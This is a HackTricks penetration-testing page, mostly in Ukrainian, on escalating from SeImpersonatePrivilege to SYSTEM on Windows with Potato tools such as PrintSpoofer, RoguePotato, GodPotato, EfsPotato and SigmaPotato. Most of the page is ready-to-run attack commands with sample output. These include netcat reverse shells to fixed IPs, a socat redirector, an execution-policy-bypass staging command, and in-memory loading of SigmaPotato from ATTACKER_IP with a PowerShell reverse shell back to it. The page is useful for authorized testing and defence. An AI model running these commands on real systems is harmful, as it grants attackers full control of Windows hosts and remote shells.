# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato не працює** на Windows Server 2019 та Windows 10 починаючи зі збірки 1809. Однак [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** можна використати, щоб **отримати ті ж привілеї та досягти рівня доступу `NT AUTHORITY\SYSTEM`**. Ця [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) детально розглядає інструмент `PrintSpoofer`, який можна використовувати для зловживання правами імперсонації на хостах Windows 10 і Server 2019, де JuicyPotato більше не працює.

> [!TIP]
> Сучасною альтернативою, яку часто підтримують у 2024–2025 роках, є SigmaPotato (форк GodPotato), що додає використання in-memory/.NET reflection та розширену підтримку ОС. Див. швидкий приклад використання нижче та репозиторій у References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Вимоги та поширені підводні камені

Усі наведені техніки залежать від зловживання привілейованим сервісом, здатним до імперсонації, з контексту, що має один із цих привілеїв:

- SeImpersonatePrivilege (найчастіше) або SeAssignPrimaryTokenPrivilege
- Висока цілісність не потрібна, якщо токен вже має SeImpersonatePrivilege (типово для багатьох сервісних облікових записів, таких як IIS AppPool, MSSQL тощо)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Операційні нотатки:

- Якщо ваш shell працює під restricted token без SeImpersonatePrivilege (що часто буває для Local Service/Network Service у деяких контекстах), відновіть базові привілеї облікового запису за допомогою FullPowers, а потім запустіть Potato. Приклад: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer потребує, щоб служба Print Spooler була запущена та доступна через локальний RPC endpoint (spoolss). У жорстко захищених оточеннях, де Spooler відключено після PrintNightmare, віддавайте перевагу RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato вимагає OXID resolver, доступного по TCP/135. Якщо egress заблоковано, використовуйте redirector/port-forwarder (див. приклад нижче). У старіших збірках потрібен був -f flag.
- EfsPotato/SharpEfsPotato зловживають MS-EFSR; якщо один pipe заблоковано, спробуйте альтернативні pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Помилка 0x6d3 під час RpcBindingSetAuthInfo зазвичай вказує на невідому/непідтримувану RPC authentication service; спробуйте інший pipe/transport або переконайтеся, що цільова служба запущена.

## Швидка демонстрація

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Примітки:
- Можна використовувати -i для запуску інтерактивного процесу в поточній консолі, або -c для виконання однорядкової команди.
- Потребує службу Spooler. Якщо вона відключена, це не спрацює.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Якщо outbound 135 заблокований, pivot the OXID resolver через socat на вашому redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato — це нова примітива зловживання COM, випущена наприкінці 2022 року, яка націлена на сервіс **PrintNotify**, а не на Spooler/BITS. Бінарник створює екземпляр PrintNotify COM-сервера, підмінює `IUnknown` на фальшивий і викликає привілейований callback через `CreatePointerMoniker`. Коли сервіс PrintNotify (що працює як **SYSTEM**) підключається назад, процес дублює повернений токен і запускає наданий payload з повними привілеями.

Key operational notes:

* Працює на Windows 10/11 та Windows Server 2012–2022 за умови встановленого Print Workflow/PrintNotify сервісу (присутній навіть коли старий Spooler відключено після PrintNightmare).
* Вимагає, щоб контекст виклику мав **SeImpersonatePrivilege** (типово для IIS APPPOOL, MSSQL та облікових записів сервісів запланованих завдань).
* Підтримує як пряму команду, так і інтерактивний режим, щоб залишатися в оригінальній консолі. Приклад:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Оскільки він повністю базується на COM, не потрібні named-pipe прослуховувачі або зовнішні редиректори, що робить його прямою заміною на хостах, де Defender блокує RPC-зв'язок RoguePotato.

Оператори, такі як Ink Dragon, запускають PrintNotifyPotato відразу після отримання ViewState RCE на SharePoint, щоб перейти від воркера `w3wp.exe` до SYSTEM перед встановленням ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Порада: якщо один пайп не працює або EDR його блокує, спробуйте інші підтримувані пайпи:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Примітки:
- Працює на Windows 8/8.1–11 та Server 2012–2022, коли присутній SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato пропонує два варіанти, що націлені на service DCOM objects, які за замовчуванням використовують RPC_C_IMP_LEVEL_IMPERSONATE. Скомпілюйте або використайте надані binaries і запустіть вашу команду:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (оновлений форк GodPotato)

SigmaPotato додає сучасні зручності, такі як виконання в пам'яті через .NET reflection та PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Посилання

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
